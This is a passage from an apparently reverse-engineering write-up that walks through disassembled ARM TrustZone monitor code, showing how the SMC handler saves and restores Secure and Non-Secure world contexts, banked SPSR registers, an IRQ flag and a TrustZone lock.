&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1F0&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1F4&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1F8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R7&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1FC&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D200&lt;/span&gt;                 &lt;span class="no"&gt;LDMEA&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.A.f Exception return to Secure world&lt;/h5&gt;

&lt;p&gt;Finally, the Monitor stack address is restored, and a Return From
Exception (RFE) instruction loads the LR and the CPSR of
interrupted Secure World from a specific address in Secure
memory.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D204&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Monitor stack address&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D208&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_status&lt;/span&gt; &lt;span class="c1"&gt;; ptr to previously-saved Secure LR &amp;amp; CPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D20C&lt;/span&gt;                 &lt;span class="no"&gt;RFEIA&lt;/span&gt;           &lt;span class="no"&gt;LR&lt;/span&gt;      &lt;span class="c1"&gt;; Return From Exception to Secure World&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;IV.3.B Return to Non-Secure World&lt;/h3&gt;

&lt;p&gt;In the case where SCR.NS is not set, the Secure world returns
results to calling function in Non-Secure world.&lt;/p&gt;
&lt;p&gt;A lot of operations here are similar to those previously described
in the "Call to Secure World" section.&lt;/p&gt;
&lt;h5&gt;IV.3.B.a Pre-exception status&lt;/h5&gt;

&lt;p&gt;First, LR_mon &amp;amp; SPSR_mon registers are saved in Secure memory to be
restored next time the TrustZone is entered. LR_mon contains the
return address in Secure world (right after the SMC instruction).
The purpose of SPSR_mon is to record the pre-exception value of the
CPSR.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D210&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_status&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Secure status&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D214&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; read Secure return address (LR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D218&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read Secure CPSR (SPSR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D21C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="c1"&gt;; write LR_mon &amp;amp; SPSR_mon&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.B.b Context switching&lt;/h5&gt;

&lt;p&gt;Then, the Secure World context is saved, and the Normal World
context is restored from a previous context switch (Normal to
Secure World).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D224&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;  &lt;span class="c1"&gt;; save Monitor stack address&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D228&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_context&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Secure context&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D22C&lt;/span&gt;                 &lt;span class="no"&gt;STMFD&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D230&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D234&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D238&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D23C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D240&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D244&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D248&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D24C&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D250&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D254&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D258&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D25C&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_und&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D260&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D264&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D268&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D26C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D270&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D274&lt;/span&gt;                 &lt;span class="no"&gt;SUB&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x94 ; NS_core_context = SP (S_core_context) - 0x94&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D278&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;  &lt;span class="c1"&gt;; secure area where previous Non-Secure context is stored&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D27C&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D280&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D284&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D288&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D28C&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D290&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D294&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D298&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D29C&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2A0&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2A4&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2A8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_und&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2AC&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2B0&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2B4&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R7&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2B8&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2BC&lt;/span&gt;                 &lt;span class="no"&gt;LDMEA&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2C0&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; restore Monitor stack address&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.B.c IRQ interrupt flag&lt;/h5&gt;

&lt;p&gt;Next instructions check the DWORD value which indicates that an IRQ
interrupt occurred. If this flag is set, the return value is set to
1 in R0.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2C4&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_irq_interrupted&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2C8&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2CC&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; if an IRQ interrupt occurred&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2D0&lt;/span&gt;                 &lt;span class="no"&gt;MOVNE&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#1  ; then set return value to 1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This may seem pointless in the context of the SMC handler. But
actually this part of code is also used by the IRQ handler to
return to the Normal World.&lt;/p&gt;
&lt;h5&gt;IV.3.B.d Non-secure CPSR &amp; LR&lt;/h5&gt;

&lt;p&gt;Then CPSR and LR from previously interrupted Non-Secure state are
written to SPSR_mon and LR_mon.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2D4&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_status&lt;/span&gt; &lt;span class="c1"&gt;; ptr to previously-saved Non-Secure LR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2D8&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; restore Non-Secure return address&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2DC&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_status.SPSR&lt;/span&gt; &lt;span class="c1"&gt;; ptr to previously-saved Non-Secure CPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2E0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2E4&lt;/span&gt;                 &lt;span class="no"&gt;BIC&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#CPSR_MASK_FIQ ; clear CPSR.F: FIQ exceptions not masked&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2E8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R3&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2EC&lt;/span&gt;                 &lt;span class="no"&gt;DMB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;They will be used later for the exception return.&lt;/p&gt;
&lt;h5&gt;IV.3.B.e TrustZone lock&lt;/h5&gt;

&lt;p&gt;After that, tz_lock DWORD is cleared to indicate that this core is no longer running in TrustZone.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2F0&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_lock&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2F4&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2F8&lt;/span&gt;                 &lt;span class="no"&gt;STR&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; clear tz_lock&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D2FC&lt;/span&gt;                 &lt;span class="no"&gt;DMB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h5&gt;IV.3.B.f Exception return to Non-Secure world&lt;/h5&gt;

&lt;p&gt;The MCR instruction writes to the SCR register to modify the
configuration of the current security state:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D300&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; clear R2 to avoid leak&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D304&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D308&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#SCR_NS OR SCR_FIQ OR SCR_AW ; 0b100101&lt;/span&gt;
